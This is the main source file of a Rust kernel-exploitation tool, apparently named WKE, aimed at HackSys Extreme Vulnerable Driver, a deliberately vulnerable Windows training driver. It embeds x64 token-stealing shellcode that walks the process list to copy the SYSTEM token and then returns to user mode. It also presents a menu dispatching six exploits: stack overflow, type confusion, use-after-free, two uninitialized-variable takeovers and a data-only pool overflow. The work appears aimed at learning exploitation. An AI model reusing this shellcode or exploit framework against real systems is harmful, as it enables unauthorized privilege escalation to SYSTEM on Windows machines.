#![feature(offset_of_nested)]

pub mod gadgets;
pub mod hevd_exploits;
pub mod hevd_exploits_data_only;
pub mod utils;

pub fn available_options() {
    println!("{}", "1. HEVD Stack Buffer Overflow");
    println!("{}", "2. HEVD Type Confusion");
    println!("{}", "3. HEVD Use-After-Free");
    println!("{}", "4. HEVD Uninitialized Heap Variable Takeover");
    println!("{}", "5. HEVD Uninitialized Stack Variable Takeover");
    println!(
        "{}",
        "6. HEVD NX Non-Paged Pool Buffer Overflow (Data-Only)"
    );
}

#[allow(unused_variables)]
fn main() {
    let shellcode: Vec<u8> = vec![
        0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00,
        0x00, 0x49, 0x89, 0xc0, 0x4d, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xe8, 0x48,
        0x04, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xf9, 0x04, 0x75,
        0xe5, 0x49, 0x8b, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8,
        0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88,
        0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48,
        0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b,
        0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
        0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0xff,
    ];

    println!("Welcome to WKE!");

    available_options();

    loop {
        print!("WKE:> ");
        std::io::Write::flush(&mut std::io::stdout()).expect("[!] Failed to flush input");

        let mut input = String::new();
        std::io::stdin()
            .read_line(&mut input)
            .expect("[!] Failed to read user input");

        match input.trim().to_lowercase().as_str() {
            "1" => hevd_exploits::hevd_stack_buffer_overflow(shellcode.clone()),
            "2" => hevd_exploits::hevd_type_confusion(shellcode.clone()),
            "3" => hevd_exploits::hevd_use_after_free(shellcode.clone()),
            "4" => hevd_exploits::hevd_uninitialized_heap_variable_takeover(),
            "5" => hevd_exploits::hevd_uninitialized_stack_variable_takeover(),
            "6" => hevd_exploits_data_only::hevd_data_only_exploit(),
            _ => println!("[!] Please enter a valid numbered option"),
        }
    }
}
